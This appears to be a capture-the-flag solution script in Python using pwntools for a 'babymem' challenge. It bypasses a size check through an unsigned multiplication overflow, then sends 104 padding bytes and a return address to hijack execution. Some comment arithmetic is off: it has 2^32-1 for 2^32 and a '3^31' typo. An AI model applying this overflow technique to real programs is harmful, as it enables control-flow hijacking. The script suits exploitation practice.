import pwn

p = pwn.process("/challenge/babymem-level-5-1")

# record_size * record_num <= 66
# we just need to overflow the mul
#
# considering the following: record_num = 2; record_size = s; 
# we have 2s <= 66
# considering s as an unsigned int we must have 2s <= 66 + k*(2^32-1)
# thus s <= 33 + 2^31
# by sending s = 2^31 + 33 the check is valid
# by sending s = 3^31 + 34 it is not

p.readuntil(b"to send: ")
p.writeline("2")

p.readuntil(b"payload record: ")
p.writeline("2147483681")

p.readuntil(b"bytes)!")
val = pwn.p64(0x00000000004014bc)
p.write(b"A"*104+val)

print(p.readall().decode("utf-8"))
